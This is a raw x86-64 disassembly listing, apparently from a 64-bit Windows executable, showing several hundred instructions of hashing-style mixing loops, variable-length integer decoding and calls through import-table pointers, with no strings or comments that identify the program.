   140052121:	mov    QWORD PTR [rbp+0xdc0],rax
   140052128:	jmp    0x140051bd0
   14005212d:	add    rax,0xfffffffffffffff8
   140052131:	mov    QWORD PTR [rbp+0xdc0],rax
   140052138:	mov    r9,QWORD PTR [rbp+0xdb8]
   14005213f:	mov    r10,r9
   140052142:	mov    ecx,eax
   140052144:	shr    r10,cl
   140052147:	mov    r11,QWORD PTR [rbp+0xdb0]
   14005214e:	mov    rdx,r11
   140052151:	shrd   rdx,r9,cl
   140052155:	push   0xffffffffffffffff
   140052157:	pop    rdi
   140052158:	mov    rsi,rdi
   14005215b:	shl    rsi,cl
   14005215e:	test   al,0x40
   140052160:	cmovne rdx,r10
   140052164:	mov    ecx,0x0
   140052169:	cmove  rcx,rsi
   14005216d:	cmove  rsi,rdi
   140052171:	not    rsi
   140052174:	not    rcx
   140052177:	and    rcx,r11
   14005217a:	and    rsi,r9
   14005217d:	test   rax,rax
   140052180:	cmove  rsi,rax
   140052184:	cmove  rcx,rax
   140052188:	mov    QWORD PTR [rbp+0xdb0],rcx
   14005218f:	mov    QWORD PTR [rbp+0xdb8],rsi
   140052196:	add    r8,0x8
   14005219a:	mov    QWORD PTR [rbp+0xdc8],r8
   1400521a1:	inc    r14
   1400521a4:	lea    rcx,[rbp+0x500]
   1400521ab:	call   0x14003c141
   1400521b0:	jmp    0x140051ba1
   1400521b5:	mov    rbx,QWORD PTR [rbp+0x500]
   1400521bc:	mov    r13,QWORD PTR [rbp+0x508]
   1400521c3:	mov    rsi,QWORD PTR [rbp+0x510]
   1400521ca:	add    rsi,r13
   1400521cd:	mov    QWORD PTR [rbp+0x7d0],r13
   1400521d4:	mov    QWORD PTR [rbp+0x7d8],rsi
   1400521db:	mov    QWORD PTR [rbp+0x7e0],0x8
   1400521e6:	and    QWORD PTR [rbp+0x7e8],0x0
   1400521ee:	xor    edi,edi
   1400521f0:	lea    rcx,[rbp+0x7d0]
   1400521f7:	call   0x14003ba96
   1400521fc:	test   rdx,rdx
   1400521ff:	je     0x140052211
   140052201:	movzx  edx,BYTE PTR [rdx]
   140052204:	shl    eax,0x3
   140052207:	mov    ecx,eax
   140052209:	shl    rdx,cl
   14005220c:	or     rdi,rdx
   14005220f:	jmp    0x1400521f0
   140052211:	mov    r9,rdi
   140052214:	movabs rax,0x4f1bbcdca8279931
   14005221e:	imul   r9,rax
   140052222:	rol    r9,0x11
   140052226:	xor    r9,rdi
   140052229:	mov    r10,r9
   14005222c:	movabs rax,0x6b1f30a8d4c752e9
   140052236:	xor    r10,rax
   140052239:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140052240:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140052247:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14005224e:	movaps XMMWORD PTR [rbp+0x800],xmm7
   140052255:	movaps XMMWORD PTR [rbp+0x810],xmm7
   14005225c:	movaps XMMWORD PTR [rbp+0x820],xmm7
   140052263:	movaps XMMWORD PTR [rbp+0x830],xmm7
   14005226a:	movaps XMMWORD PTR [rbp+0x840],xmm7
   140052271:	movabs rax,0x1f91b0e3369d229e
   14005227b:	xor    r9,rax
   14005227e:	mov    r11,r10
   140052281:	or     r11,0x1
   140052285:	rol    r11,0x15
   140052289:	lea    rdi,[r12+0x1]
   14005228e:	xor    r14d,r14d
   140052291:	cmp    r14,0x10
   140052295:	je     0x140052361
   14005229b:	mov    rax,r14
   14005229e:	movabs rcx,0x32a27dbe0b6bcf37
   1400522a8:	imul   rax,rcx
   1400522ac:	rol    rax,0x20
   1400522b0:	xor    rax,r10
   1400522b3:	mov    rcx,r11
   1400522b6:	push   0x7
   1400522b8:	pop    rdx
   1400522b9:	mov    r8,r9
   1400522bc:	sub    edx,0x1
   1400522bf:	jb     0x1400522f5
   1400522c1:	mov    r15,rcx
   1400522c4:	xor    r15,rax
   1400522c7:	add    r15,r8
   1400522ca:	rol    r15,0x28
   1400522ce:	add    rax,r15
   1400522d1:	rol    rax,0xf
   1400522d5:	mov    r8,rax
   1400522d8:	shr    r8,0x1d
   1400522dc:	xor    rax,r8
   1400522df:	movabs r8,0x79ca1cd2f36bd757
   1400522e9:	imul   r15,r8
   1400522ed:	add    rcx,r11
   1400522f0:	mov    r8,r15
   1400522f3:	jmp    0x1400522bc
   1400522f5:	lea    rcx,[r14*4+0x4]
   1400522fd:	xor    r15d,r15d
   140052300:	cmp    rcx,QWORD PTR [rbp+0x1180]
   140052307:	ja     0x14005231c
   140052309:	lea    rcx,[r14*4+0x0]
   140052311:	mov    rdx,QWORD PTR [rbp+0x1148]
   140052318:	mov    r15d,DWORD PTR [rdx+rcx*1]
   14005231c:	xor    r8,rax
   14005231f:	mov    rax,r8
   140052322:	shr    rax,0x18
   140052326:	xor    edx,edx
   140052328:	push   0x1f
   14005232a:	pop    rcx
   14005232b:	div    ecx
   14005232d:	lea    ecx,[rdx+0x1]
   140052330:	ror    r15d,cl
   140052333:	mov    rax,r8
   140052336:	shr    rax,0x10
   14005233a:	mov    rcx,r8
   14005233d:	shr    rcx,0x28
   140052341:	xor    ecx,eax
   140052343:	xor    r8d,ecx
   140052346:	xor    r8d,r15d
   140052349:	mov    rax,r8
   14005234c:	xor    edx,edx
   14005234e:	div    rdi
   140052351:	mov    QWORD PTR [rbp+r14*8+0x7d0],rdx
   140052359:	inc    r14
   14005235c:	jmp    0x140052291
   140052361:	and    QWORD PTR [rbp+0xf80],0x0
   140052369:	mov    QWORD PTR [rbp+0x1060],r13
   140052370:	mov    QWORD PTR [rbp+0x1068],rsi
   140052377:	mov    QWORD PTR [rbp+0x1070],0x8
   140052382:	and    QWORD PTR [rbp+0x1078],0x0
   14005238a:	lea    rcx,[rbp+0x1060]
   140052391:	call   0x14003ba96
   140052396:	test   rdx,rdx
   140052399:	je     0x1400523b0
   14005239b:	cmp    rax,0x7
   14005239f:	ja     0x14004a57a
   1400523a5:	mov    cl,BYTE PTR [rdx]
   1400523a7:	mov    BYTE PTR [rbp+rax*1+0xf80],cl
   1400523ae:	jmp    0x14005238a
   1400523b0:	mov    ecx,0x80
   1400523b5:	lea    rdi,[rbp+0x1060]
   1400523bc:	lea    rsi,[rbp+0x7d0]
   1400523c3:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   1400523c5:	mov    rsi,QWORD PTR [rbp+0xf80]
   1400523cc:	mov    rcx,rbx
   1400523cf:	mov    rdx,r13
   1400523d2:	call   0x14006f7f7
   1400523d7:	mov    rcx,QWORD PTR [rbp+0x1138]
   1400523de:	mov    rdx,QWORD PTR [rbp+0x1148]
   1400523e5:	call   0x14006f7f7
   1400523ea:	mov    QWORD PTR [rbp+0x610],rsi
   1400523f1:	mov    rax,QWORD PTR [rbp+0xd58]
   1400523f8:	sub    QWORD PTR [rbp+0x1160],rax
   1400523ff:	jb     0x14005a158
   140052405:	mov    ecx,DWORD PTR [rbp+0x6c8]
   14005240b:	mov    DWORD PTR [rbp+0xf80],ecx
   140052411:	mov    ecx,DWORD PTR [rbp+0x1134]
   140052417:	mov    DWORD PTR [rbp+0xf84],ecx
   14005241d:	mov    ecx,DWORD PTR [rbp+0x6c0]
   140052423:	mov    DWORD PTR [rbp+0xf88],ecx
   140052429:	mov    ecx,DWORD PTR [rbp+0xcb8]
   14005242f:	mov    DWORD PTR [rbp+0xf8c],ecx
   140052435:	mov    ecx,DWORD PTR [rbp+0x5f0]
   14005243b:	mov    DWORD PTR [rbp+0xf90],ecx
   140052441:	je     0x14005a158
   140052447:	mov    rdi,QWORD PTR [rbp+0x1170]
   14005244e:	add    rdi,rax
   140052451:	mov    rcx,QWORD PTR [rbp+0x1158]
   140052458:	lea    rdx,[rbp+0xf80]
   14005245f:	call   0x14003ad8d
   140052464:	mov    eax,DWORD PTR [rbp+0xf90]
   14005246a:	lea    rdx,[rbp+0x7d8]
   140052471:	mov    DWORD PTR [rdx+0x80],eax
   140052477:	movups xmm0,XMMWORD PTR [rbp+0xf80]
   14005247e:	movups XMMWORD PTR [rdx+0x70],xmm0
   140052482:	mov    rax,QWORD PTR [rbp+0xce0]
   140052489:	lea    rcx,[rbp+0x7e8]
   140052490:	mov    QWORD PTR [rcx+0x20],rax
   140052494:	mov    r9,QWORD PTR [rbp+0x7a0]
   14005249b:	shr    r9,0x3d
   14005249f:	mov    r8,QWORD PTR [rbp+0xf70]
   1400524a6:	lea    rax,[r8*8+0x0]
   1400524ae:	neg    r9
   1400524b1:	mov    esi,0x0
   1400524b6:	sbb    rsi,rsi
   1400524b9:	or     rsi,rax
   1400524bc:	movaps xmm0,XMMWORD PTR [rbp+0xcc0]
   1400524c3:	movaps xmm1,XMMWORD PTR [rbp+0xcd0]
   1400524ca:	movups XMMWORD PTR [rcx+0x10],xmm1
   1400524ce:	movups XMMWORD PTR [rcx],xmm0
   1400524d1:	mov    QWORD PTR [rbp+0x1170],rdi
   1400524d8:	mov    QWORD PTR [rbp+0x7d0],rdi
   1400524df:	mov    rcx,QWORD PTR [rbp+0x1160]
   1400524e6:	mov    QWORD PTR [rbp+0x7d8],rcx
   1400524ed:	mov    rax,QWORD PTR [rbp+0x1178]
   1400524f4:	mov    QWORD PTR [rbp+0x7e0],rax
   1400524fb:	mov    QWORD PTR [rbp+0x810],r8
   140052502:	movups XMMWORD PTR [rdx+0x40],xmm7
   140052506:	mov    QWORD PTR [rbp+0x828],rcx
   14005250d:	mov    rax,QWORD PTR [rbp+0x608]
   140052514:	mov    QWORD PTR [rbp+0x830],rax
   14005251b:	mov    rax,QWORD PTR [rbp+0x6d8]
   140052522:	mov    QWORD PTR [rbp+0x838],rax
   140052529:	mov    rax,QWORD PTR [rbp+0x3f0]
   140052530:	mov    QWORD PTR [rbp+0x840],rax
   140052537:	mov    rax,QWORD PTR [rbp+0xcb0]
   14005253e:	movaps XMMWORD PTR [rax+0x10],xmm7
   140052542:	movaps XMMWORD PTR [rax],xmm7
   140052545:	mov    QWORD PTR [rbp+0x890],rsi
   14005254c:	lea    rax,[rbp+0x610]
   140052553:	mov    QWORD PTR [rbp+0xf80],rax
   14005255a:	lea    rax,[rbp+0x618]
   140052561:	mov    QWORD PTR [rbp+0xf88],rax
   140052568:	mov    QWORD PTR [rbp+0xf90],0x8
   140052573:	and    QWORD PTR [rbp+0xf98],0x0
   14005257b:	xor    edi,edi
   14005257d:	lea    rcx,[rbp+0xf80]
   140052584:	call   0x14003ba96
   140052589:	test   rdx,rdx
   14005258c:	je     0x14005259e
   14005258e:	movzx  edx,BYTE PTR [rdx]
   140052591:	shl    eax,0x3
   140052594:	mov    ecx,eax
   140052596:	shl    rdx,cl
   140052599:	or     rdi,rdx
   14005259c:	jmp    0x14005257d
   14005259e:	mov    rax,rdi
   1400525a1:	movabs rcx,0x4f1bbcdca8279931
   1400525ab:	imul   rax,rcx
   1400525af:	rol    rax,0x11
   1400525b3:	xor    rax,rdi
   1400525b6:	mov    rdx,rax
   1400525b9:	movabs rcx,0x6b1f30a8d4c752e9
   1400525c3:	xor    rdx,rcx
   1400525c6:	movabs rcx,0x1f91b0e3369d229e
   1400525d0:	xor    rax,rcx
   1400525d3:	mov    rcx,rdx
   1400525d6:	xor    rcx,QWORD PTR [rbp+0x5e8]
   1400525dd:	or     rdx,0x1
   1400525e1:	rol    rdx,0x15
   1400525e5:	mov    r8,rdx
   1400525e8:	push   0x7
   1400525ea:	pop    r9
   1400525ec:	sub    r9d,0x1
   1400525f0:	jb     0x140052626
   1400525f2:	mov    r10,r8
   1400525f5:	xor    r10,rcx
   1400525f8:	add    r10,rax
   1400525fb:	rol    r10,0x28
   1400525ff:	add    rcx,r10
   140052602:	rol    rcx,0xf
   140052606:	mov    rax,rcx
   140052609:	shr    rax,0x1d
   14005260d:	xor    rcx,rax
   140052610:	movabs rax,0x79ca1cd2f36bd757
   14005261a:	imul   r10,rax
   14005261e:	add    r8,rdx
   140052621:	mov    rax,r10
   140052624:	jmp    0x1400525ec
   140052626:	mov    r8,r12
   140052629:	mov    rdx,QWORD PTR [rbp+0x7c8]
   140052630:	sub    r8,QWORD PTR [rbp+rdx*8+0x1060]
   140052638:	inc    r8
   14005263b:	je     0x14005a1ee
   140052641:	xor    rax,rcx
   140052644:	shr    rax,0x20
   140052648:	imul   r12,QWORD PTR [rbp+0x7c8]
   140052650:	xor    edx,edx
   140052652:	div    r8
   140052655:	add    rdx,r12
   140052658:	mov    QWORD PTR [rbp+0x1180],rdx
   14005265f:	je     0x140052ca8
   140052665:	mov    eax,0x10000
   14005266a:	mov    rcx,QWORD PTR [rbp+0x1180]
   140052671:	cmp    rcx,rax
   140052674:	mov    edx,0x10000
   140052679:	cmovb  rdx,rcx
   14005267d:	lea    rcx,[rbp+0x640]
   140052684:	call   0x14003c111
   140052689:	xor    ebx,ebx
   14005268b:	xor    r12d,r12d
   14005268e:	xor    r15d,r15d
   140052691:	xor    edi,edi
   140052693:	xor    r14d,r14d
   140052696:	xor    r13d,r13d
   140052699:	cmp    r13,QWORD PTR [rbp+0x1180]
   1400526a0:	jae    0x140052c95
   1400526a6:	lea    rax,[r14+0x8]
   1400526aa:	cmp    rax,rsi
   1400526ad:	jbe    0x1400526b6
   1400526af:	xor    edx,edx
   1400526b1:	jmp    0x140052c81
   1400526b6:	cmp    rdi,0x8
   1400526ba:	jae    0x140052c0f
   1400526c0:	cmp    rbx,QWORD PTR [rbp+0x828]
   1400526c7:	jae    0x14005270d
   1400526c9:	mov    rax,QWORD PTR [rbp+0x7d8]
   1400526d0:	mov    rcx,QWORD PTR [rbp+0x818]
   1400526d7:	cmp    rcx,rax
   1400526da:	jae    0x14005270d
   1400526dc:	mov    rdx,QWORD PTR [rbp+0x1170]
   1400526e3:	movzx  esi,BYTE PTR [rdx+rcx*1]
   1400526e7:	and    esi,0x7f
   1400526ea:	inc    rcx
   1400526ed:	cmp    rcx,rax
   1400526f0:	jae    0x140052717
   1400526f2:	mov    rdx,QWORD PTR [rbp+0x1170]
   1400526f9:	movzx  edx,BYTE PTR [rdx+rcx*1]
   1400526fd:	test   dl,dl
   1400526ff:	jns    0x140052714
   140052701:	shl    rsi,0x7
   140052705:	and    edx,0x7f
   140052708:	or     rsi,rdx
   14005270b:	jmp    0x1400526ea
   14005270d:	xor    edx,edx
   14005270f:	jmp    0x140052b9a
   140052714:	mov    rax,rcx
   140052717:	mov    QWORD PTR [rbp+0x818],rax
   14005271e:	mov    rax,rsi
   140052721:	shr    rax,0x8
   140052725:	mov    rdi,rsi
   140052728:	shr    rdi,0x28
   14005272c:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140052733:	movaps XMMWORD PTR [rbp+0x730],xmm7
   14005273a:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140052741:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140052748:	mov    DWORD PTR [rbp+0xf80],eax
   14005274e:	lea    rax,[rip+0x35903]        # 0x140088058
   140052755:	mov    QWORD PTR [rsp+0x20],rax
   14005275a:	lea    rcx,[rbp+0x710]
   140052761:	push   0x4
   140052763:	pop    rdx
   140052764:	lea    r8,[rbp+0xf80]
   14005276b:	mov    r9,rdx
   14005276e:	call   0x1400638fe
   140052773:	mov    BYTE PTR [rbp+0x714],dil
   14005277a:	mov    rdi,QWORD PTR [rbp+0x7f0]
   140052781:	cmp    QWORD PTR [rbp+0x838],rdi
   140052788:	jbe    0x1400528b4
   14005278e:	mov    r9,QWORD PTR [rbp+0x7f8]
   140052795:	cmp    r9,0x4
   140052799:	ja     0x140059d9c
   14005279f:	mov    rcx,QWORD PTR [rbp+0x800]
   1400527a6:	cmp    rcx,0x5
   1400527aa:	jae    0x140059dae
   1400527b0:	mov    r14,QWORD PTR [rbp+0x838]
   1400527b7:	cmp    r14,rdi
   1400527ba:	je     0x140059dbc
   1400527c0:	mov    r8,r14
   1400527c3:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   1400527ca:	mov    cl,BYTE PTR [rbp+0x808]
   1400527d0:	rol    eax,cl
   1400527d2:	sub    r8,rdi
   1400527d5:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   1400527dd:	xor    edx,edx
   1400527df:	div    r8
   1400527e2:	mov    rbx,rdx
   1400527e5:	mov    rax,QWORD PTR [rbp+0x840]
   1400527ec:	mov    QWORD PTR [rbp+0x500],rax
   1400527f3:	cmp    rdi,0x40
   1400527f7:	push   0x40
   1400527f9:	pop    rax
   1400527fa:	cmovae rdi,rax
   1400527fe:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140052805:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14005280c:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140052813:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14005281a:	lea    rcx,[rbp+0xf80]
   140052821:	mov    rdx,rdi
   140052824:	call   0x14003c0b8
   140052829:	test   r14,r14
   14005282c:	je     0x14005287a
   14005282e:	mov    rcx,rax
   140052831:	mov    r8,rdx
   140052834:	mov    rax,rdx
   140052837:	add    rax,rbx
   14005283a:	mov    r9,QWORD PTR [rbp+0x830]
   140052841:	cmp    rax,r14
   140052844:	jbe    0x140052864
   140052846:	xor    r10d,r10d
   140052849:	cmp    r8,r10
   14005284c:	je     0x14005287a
   14005284e:	lea    rax,[r10+rbx*1]
   140052852:	xor    edx,edx
   140052854:	div    r14
   140052857:	mov    al,BYTE PTR [r9+rdx*1]
   14005285b:	mov    BYTE PTR [rcx+r10*1],al
   14005285f:	inc    r10
   140052862:	jmp    0x140052849
   140052864:	add    r9,rbx
   140052867:	xor    eax,eax
   140052869:	cmp    r8,rax
   14005286c:	je     0x14005287a
   14005286e:	mov    dl,BYTE PTR [r9+rax*1]
   140052872:	mov    BYTE PTR [rcx+rax*1],dl
   140052875:	inc    rax
   140052878:	jmp    0x140052869
   14005287a:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140052881:	xor    eax,eax
   140052883:	cmp    rdi,rax
   140052886:	je     0x1400528b4
   140052888:	cmp    rcx,0x3f
   14005288c:	ja     0x140059d8e
   140052892:	mov    edx,eax
   140052894:	and    edx,0x7
   140052897:	mov    dl,BYTE PTR [rbp+rdx*1+0x500]
   14005289e:	xor    dl,BYTE PTR [rbp+rax*1+0xf80]
   1400528a5:	inc    rax
   1400528a8:	mov    BYTE PTR [rbp+rcx*1+0x710],dl
   1400528af:	inc    rcx
   1400528b2:	jmp    0x140052883
   1400528b4:	movaps XMMWORD PTR [rbp+0x530],xmm7
   1400528bb:	movaps XMMWORD PTR [rbp+0x520],xmm7
   1400528c2:	movaps XMMWORD PTR [rbp+0x510],xmm7
   1400528c9:	movaps XMMWORD PTR [rbp+0x500],xmm7
   1400528d0:	xor    eax,eax
   1400528d2:	cmp    rax,0x40
   1400528d6:	je     0x1400528ee
   1400528d8:	mov    ecx,DWORD PTR [rbp+rax*1+0x710]
   1400528df:	bswap  ecx
   1400528e1:	mov    DWORD PTR [rbp+rax*1+0x500],ecx
   1400528e8:	add    rax,0x4
   1400528ec:	jmp    0x1400528d2
   1400528ee:	movups xmm0,XMMWORD PTR [rbp+0x848]
   1400528f5:	mov    eax,DWORD PTR [rbp+0x858]
   1400528fb:	movups XMMWORD PTR [rbp+0xf80],xmm0
   140052902:	mov    DWORD PTR [rbp+0xf90],eax
   140052908:	and    DWORD PTR [rbp+0xf94],0x0
   14005290f:	movaps xmm0,XMMWORD PTR [rbp+0x500]
   140052916:	movaps xmm1,XMMWORD PTR [rbp+0x510]
   14005291d:	movaps xmm2,XMMWORD PTR [rbp+0x520]
   140052924:	movaps xmm3,XMMWORD PTR [rbp+0x530]
   14005292b:	lea    rax,[rbp+0xf98]
   140052932:	movups XMMWORD PTR [rax+0x30],xmm3
   140052936:	movups XMMWORD PTR [rax+0x20],xmm2
   14005293a:	movups XMMWORD PTR [rax+0x10],xmm1
   14005293e:	movups XMMWORD PTR [rax],xmm0
   140052941:	call   0x140064214
   140052946:	mov    al,BYTE PTR [rip+0x46141]        # 0x140098a8d
   14005294c:	cmp    al,0x1
   14005294e:	je     0x140052997
   140052950:	movzx  eax,al
   140052953:	cmp    eax,0x2
   140052956:	je     0x140052a3d
   14005295c:	and    DWORD PTR [rbp+0x680],0x0
   140052963:	lea    rcx,[rip+0xfffffffffffae716]        # 0x140001080
   14005296a:	mov    rdx,QWORD PTR [rbp+0x1150]
   140052971:	push   0x40
   140052973:	pop    r8
   140052975:	lea    r9,[rbp+0x680]
   14005297c:	call   QWORD PTR [rip+0x41e86]        # 0x140094808
   140052982:	test   eax,eax
   140052984:	sete   cl
   140052987:	inc    cl
   140052989:	mov    BYTE PTR [rip+0x460fe],cl        # 0x140098a8d
   14005298f:	test   eax,eax
   140052991:	je     0x140052a3d
   140052997:	mov    al,BYTE PTR [rip+0x4621b]        # 0x140098bb8
   14005299d:	cmp    al,0x1
   14005299f:	je     0x1400529c4
   1400529a1:	movzx  eax,al
   1400529a4:	test   eax,eax
   1400529a6:	jne    0x140052a3d
   1400529ac:	call   0x140065d51
   1400529b1:	test   rax,rax
   1400529b4:	sete   cl
   1400529b7:	inc    cl
   1400529b9:	mov    BYTE PTR [rip+0x461f9],cl        # 0x140098bb8
   1400529bf:	test   rax,rax
   1400529c2:	je     0x140052a3d
   1400529c4:	call   0x140064227
   1400529c9:	mov    eax,0xc8c291de
   1400529ce:	xchg   DWORD PTR [rip+0x4610c],eax        # 0x140098ae0
   1400529d4:	call   QWORD PTR [rip+0x41c76]        # 0x140094650
   1400529da:	mov    eax,eax
   1400529dc:	mov    QWORD PTR [rip+0x4561d],rax        # 0x140098000
   1400529e3:	lea    rcx,[rbp+0xf80]
   1400529ea:	push   0xffffffffffffffff
   1400529ec:	pop    rdx
   1400529ed:	call   0x140010840
   1400529f2:	xor    eax,eax
   1400529f4:	xchg   DWORD PTR [rip+0x460e6],eax        # 0x140098ae0
   1400529fa:	mov    BYTE PTR [rip+0x4608d],0x0        # 0x140098a8e
   140052a01:	mov    eax,DWORD PTR [rbp+0xf80]
   140052a07:	add    DWORD PTR [rbp+0x848],eax
   140052a0d:	mov    eax,DWORD PTR [rbp+0xf84]
   140052a13:	add    DWORD PTR [rbp+0x84c],eax
   140052a19:	mov    eax,DWORD PTR [rbp+0xf88]
   140052a1f:	add    DWORD PTR [rbp+0x850],eax
   140052a25:	mov    eax,DWORD PTR [rbp+0xf8c]
   140052a2b:	add    DWORD PTR [rbp+0x854],eax
   140052a31:	mov    eax,DWORD PTR [rbp+0xf90]
   140052a37:	add    DWORD PTR [rbp+0x858],eax
   140052a3d:	mov    BYTE PTR [rip+0x46048],0x0        # 0x140098a8c
   140052a44:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140052a4b:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140052a52:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140052a59:	xor    eax,eax
   140052a5b:	cmp    rax,0x14
   140052a5f:	je     0x140052a77
   140052a61:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   140052a68:	bswap  ecx
   140052a6a:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   140052a71:	add    rax,0x4
   140052a75:	jmp    0x140052a5b
   140052a77:	mov    rax,QWORD PTR [rbp+0x7e0]
   140052a7e:	mov    QWORD PTR [rbp+0x1178],rax
   140052a85:	mov    eax,esi
   140052a87:	shr    eax,0x3
   140052a8a:	and    eax,0x1f
   140052a8d:	lea    rcx,[rax+rbp*1]
   140052a91:	add    rcx,0xf80
   140052a98:	xor    r8d,r8d
   140052a9b:	xor    edx,edx
   140052a9d:	xor    eax,eax
   140052a9f:	cmp    r8,0x10
   140052aa3:	je     0x140052abe
   140052aa5:	shld   rax,rdx,0x8
   140052aaa:	mov    r9,rdx
   140052aad:	shl    r9,0x8
   140052ab1:	movzx  edx,BYTE PTR [rcx+r8*1]
   140052ab6:	inc    r8
   140052ab9:	or     rdx,r9
   140052abc:	jmp    0x140052a9f
   140052abe:	push   0xffffffffffffffff
   140052ac0:	pop    r8
   140052ac2:	mov    r9,r8
   140052ac5:	mov    r10,QWORD PTR [rbp+0x1178]
   140052acc:	mov    ecx,r10d
   140052acf:	shl    r9,cl
   140052ad2:	cmp    r10,0x40
   140052ad6:	not    r9
   140052ad9:	cmovae r9,r8
   140052add:	and    esi,0x7
   140052ae0:	lea    ecx,[r10+rsi*1]
   140052ae4:	neg    cl
   140052ae6:	shrd   rdx,rax,cl
   140052aea:	shr    rax,cl
   140052aed:	test   cl,0x40
   140052af0:	cmove  rax,rdx
   140052af4:	and    rax,r9
   140052af7:	mov    rbx,QWORD PTR [rbp+0x820]
   140052afe:	add    r10,0x7
   140052b02:	bswap  rax
   140052b05:	shr    r10,0x3
   140052b09:	mov    QWORD PTR [rbp+0x500],rax
   140052b10:	mov    r8,rbx
   140052b13:	imul   r8,r10
   140052b17:	push   0x8
   140052b19:	pop    rcx
   140052b1a:	sub    rcx,r10
   140052b1d:	dec    r10
   140052b20:	mov    rax,QWORD PTR [rbp+0x1158]
   140052b27:	lea    r11,[rax+r8*1]
   140052b2b:	mov    rax,r8
   140052b2e:	xor    edx,edx
   140052b30:	push   0x14
   140052b32:	pop    rsi
   140052b33:	div    rsi
   140052b36:	cmp    rcx,0x8
   140052b3a:	je     0x140052b60
   140052b3c:	cmp    r10,0x7
   140052b40:	ja     0x140059d80
   140052b46:	imul   rax,rax,0xffffffffffffffec
   140052b4a:	mov    al,BYTE PTR [r11+rax*1]
   140052b4e:	xor    BYTE PTR [rbp+rcx*1+0x500],al
   140052b55:	inc    rcx
   140052b58:	inc    r11
   140052b5b:	inc    r8
   140052b5e:	jmp    0x140052b2b
   140052b60:	mov    rdx,QWORD PTR [rbp+0x500]
   140052b67:	bswap  rdx
   140052b6a:	and    rdx,r9
   140052b6d:	inc    rbx
   140052b70:	mov    QWORD PTR [rbp+0x820],rbx
   140052b77:	mov    rsi,QWORD PTR [rbp+0x890]
   140052b7e:	mov    r14,QWORD PTR [rbp+0x888]
   140052b85:	mov    rdi,QWORD PTR [rbp+0x880]
   140052b8c:	mov    r12,QWORD PTR [rbp+0x870]
   140052b93:	mov    r15,QWORD PTR [rbp+0x878]
   140052b9a:	mov    rax,rsi
   140052b9d:	sub    rax,r14
   140052ba0:	sub    rax,rdi
   140052ba3:	mov    r8,QWORD PTR [rbp+0x1178]
   140052baa:	cmp    rax,r8
   140052bad:	cmovae rax,r8
   140052bb1:	cmp    rax,0x1
   140052bb5:	adc    rax,0x0
   140052bb9:	mov    ecx,r8d
   140052bbc:	sub    ecx,eax
   140052bbe:	and    cl,0x3f
   140052bc1:	cmp    r8,rax
   140052bc4:	movzx  ecx,cl
   140052bc7:	mov    r8d,0x0
   140052bcd:	cmovbe ecx,r8d
   140052bd1:	shr    rdx,cl
   140052bd4:	mov    ecx,eax
   140052bd6:	shld   r15,r12,cl
   140052bda:	shl    r12,cl
   140052bdd:	test   al,0x40
   140052bdf:	cmovne r15,r12
   140052be3:	mov    ecx,0x0
   140052be8:	cmove  rcx,r12
   140052bec:	or     rcx,rdx
   140052bef:	mov    QWORD PTR [rbp+0x878],r15
   140052bf6:	mov    QWORD PTR [rbp+0x870],rcx
   140052bfd:	add    rdi,rax
   140052c00:	mov    QWORD PTR [rbp+0x880],rdi
   140052c07:	mov    r12,rcx
   140052c0a:	jmp    0x1400526b6
   140052c0f:	add    rdi,0xfffffffffffffff8
   140052c13:	mov    rax,r12
   140052c16:	mov    ecx,edi
   140052c18:	shrd   rax,r15,cl
   140052c1c:	mov    rdx,r15
   140052c1f:	shr    rdx,cl
   140052c22:	push   0xffffffffffffffff
   140052c24:	pop    r9
   140052c26:	mov    r8,r9
   140052c29:	shl    r8,cl
   140052c2c:	test   dil,0x40
   140052c30:	cmove  rdx,rax
   140052c34:	mov    rax,r9
   140052c37:	cmovne rax,r8
   140052c3b:	mov    ecx,0x0
   140052c40:	cmove  rcx,r8
   140052c44:	mov    QWORD PTR [rbp+0x880],rdi
   140052c4b:	not    rcx
   140052c4e:	not    rax
   140052c51:	and    rax,r15
   140052c54:	and    rcx,r12
   140052c57:	test   rdi,rdi
   140052c5a:	cmove  rcx,rdi
   140052c5e:	cmove  rax,rdi
   140052c62:	mov    QWORD PTR [rbp+0x878],rax
   140052c69:	mov    QWORD PTR [rbp+0x870],rcx
   140052c70:	add    r14,0x8
   140052c74:	mov    QWORD PTR [rbp+0x888],r14
   140052c7b:	mov    r12,rcx
   140052c7e:	mov    r15,rax
   140052c81:	inc    r13
   140052c84:	lea    rcx,[rbp+0x640]
   140052c8b:	call   0x14003c141
   140052c90:	jmp    0x140052699
   140052c95:	mov    rcx,QWORD PTR [rbp+0x640]
   140052c9c:	mov    rdx,QWORD PTR [rbp+0x648]
   140052ca3:	call   0x14006f7f7
   140052ca8:	mov    ecx,0xc8
   140052cad:	lea    rdi,[rbp+0x508]
   140052cb4:	lea    rsi,[rbp+0x7d8]
   140052cbb:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140052cbd:	mov    rax,QWORD PTR [rbp+0x1170]
   140052cc4:	mov    QWORD PTR [rbp+0x500],rax
   140052ccb:	mov    rax,QWORD PTR [rbp+0x200]
   140052cd2:	mov    QWORD PTR [rbp+0x1178],rax
   140052cd9:	lea    rax,[rbp+0x208]
   140052ce0:	movups xmm0,XMMWORD PTR [rax]
   140052ce3:	movups xmm1,XMMWORD PTR [rax+0x10]
   140052ce7:	movaps XMMWORD PTR [rbp+0x640],xmm0
   140052cee:	movaps XMMWORD PTR [rbp+0x650],xmm1
   140052cf5:	mov    rax,QWORD PTR [rax+0x20]
   140052cf9:	mov    QWORD PTR [rbp+0x660],rax
   140052d00:	mov    edx,0x4000
   140052d05:	lea    rcx,[rip+0x2cd44]        # 0x14007fa50
   140052d0c:	call   0x14003bee8
